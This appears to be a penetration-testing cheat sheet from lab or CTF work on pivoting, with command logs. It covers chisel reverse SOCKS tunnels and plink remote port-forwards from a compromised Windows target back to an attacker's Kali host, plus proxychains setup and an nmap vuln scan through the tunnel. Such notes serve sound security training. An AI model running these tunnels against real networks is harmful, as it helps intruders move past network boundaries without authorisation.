# Pivoting and port-forwarding

## SOCKS proxy with chisel (reverse tunneling)

Run this on Kali

```text
root@kali:/opt/chisel# ./chisel_1.7.6_linux_amd64 server -p 9001 --reverse
2021/05/17 23:35:31 server: Reverse tunnelling enabled
2021/05/17 23:35:31 server: Fingerprint 80SVlPsLD1xrSqQ6FJcbWN2y3+Fenxt3ivaewz0HtMw=
2021/05/17 23:35:31 server: Listening on http://0.0.0.0:9001
2021/05/17 23:35:59 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

Run this on the target

```text
C:\Users\admin\Downloads>chisel_1.7.6_windows_amd64.exe client 192.168.119.170:9001 R:socks
2021/05/17 15:35:57 client: Connecting to ws://192.168.119.170:9001
2021/05/17 15:35:59 client: Connected (Latency 244.9268ms)
```

**/etc/proxychains.conf** setting

```text
root@kali:~/CTF/Box# tail /etc/proxychains.conf
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4         127.0.0.1 9050
#http   127.0.0.1 8080
#socks5 127.0.0.1 22222
socks5 127.0.0.1 1080
```

Note that http proxy in /etc/proxychains.conf [must be disabled](https://security.stackexchange.com/a/106331/190435) or you might get this error

```text
root@kali:~/CTF/Box/PE# proxychains nmap -Pn -n -sTV -p2638,8443-8446,8765,9090 --script=vuln,discovery 127.0.0.1
ProxyChains-3.1 (http://proxychains.sf.net)
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-19 10:33 +08
Segmentation fault
```

## With plink.exe

Remote port-forward port 9090 back to Kali

```text
C:\Users\Public\Documents>plink32.exe -P 22022 -R 9090:127.0.0.1:9090 root@192.168.119.170
plink32.exe -P 22022 -R 9090:127.0.0.1:9090 root@192.168.119.170
Using username "root".
root@192.168.119.170's password: [pw]

Linux kali 5.3.0-kali2-amd64 #1 SMP Debian 5.3.9-3kali1 (2019-11-20) x86_64

The programs included with the Kali GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed May 19 02:09:43 2021 from 10.11.1.73
root@kali:~#
```

Or using chisel (remote port-forward 445 back to Kali)

```text
root@kali:/opt/LinuxPE# ./chisel_1.7.6_linux_amd64 server -p 9001 --reverse
2021/03/16 23:10:36 server: Reverse tunnelling enabled
2021/03/16 23:10:36 server: Fingerprint Ms42A6rCqfg5jYOw91NOpvF34hO/iJTaYXJ4FBJZExM=
2021/03/16 23:10:36 server: Listening on http://0.0.0.0:9001
2021/03/16 23:10:38 server: session#1: tun: proxy#R:445=>445: Listening

PS C:\Temp> .\chisel_1.7.6_windows_amd64.exe client 10.10.14.78:9001 R:445:127.0.0.1:445
```

To make the forwarded port available all interfaces 0.0.0.0 on Kali  so you can visit it on your hypervisor host, make sure these two settings are in **/etc/ssh/sshd_config**

```text
AllowTcpForwarding yes
GatewayPorts yes
```

